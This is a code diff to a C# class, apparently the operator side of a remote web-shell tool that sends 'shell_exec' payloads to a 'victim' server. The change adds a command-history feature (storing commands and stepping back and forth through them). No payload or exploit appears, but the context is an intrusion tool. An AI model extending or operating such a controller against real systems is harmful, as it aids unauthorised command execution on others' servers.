@@ -12,15 +12,62 @@ namespace Alien
         public string m_szCurrentDir { get; set; }
         public bool m_bIsRunning { get; set; } = false;
 
+        private List<string> m_lsHistory = new List<string>();
+        private int m_nIdx = 0;
+
         public clsfnShell(clsWeb web)
         {
             m_web = web;
             m_szCurrentDir = string.Empty;
         }
 
+        public void fnPushCommand(string szCmd)
+        {
+            m_lsHistory.Add(szCmd);
+            fnResetIndex();
+        }
+
+        private void fnResetIndex()
+        {
+            m_nIdx = m_lsHistory.Count - 1;
+            if (m_nIdx < 0)
+                m_nIdx = 0;
+        }
+
+        public string fnLastCommand()
+        {
+            if (m_lsHistory.Count == 0)
+                return string.Empty;
+
+            string szCmd = m_lsHistory[m_nIdx];
+            
+            m_nIdx--;
+            if (m_nIdx < 0)
+                m_nIdx = 0;
+
+            return szCmd;
+        }
+
+        public string fnNextCommand()
+        {
+            if (m_lsHistory.Count == 0)
+                return string.Empty;
+
+            string szCmd = m_lsHistory[m_nIdx];
+
+            m_nIdx++;
+            if (m_nIdx >= m_lsHistory.Count)
+                m_nIdx = m_lsHistory.Count - 1;
+
+            return szCmd;
+        }
+
         public async Task<string> fnShellExec(string szCommand)
         {
             string szResp = await m_web.fnszSendPayload("shell_exec", new string[] { szCommand, m_web.m_victim.ShellEncoding });
+
+            fnPushCommand(szCommand);
+            
             return szResp;
         }
 
@@ -56,6 +103,8 @@ namespace Alien
                 szOutput = szResp;
                 szCurrentDir = m_szCurrentDir;
             }
+
+            fnPushCommand(szCommand);
 
             return (szCurrentDir, szOutput);
         }
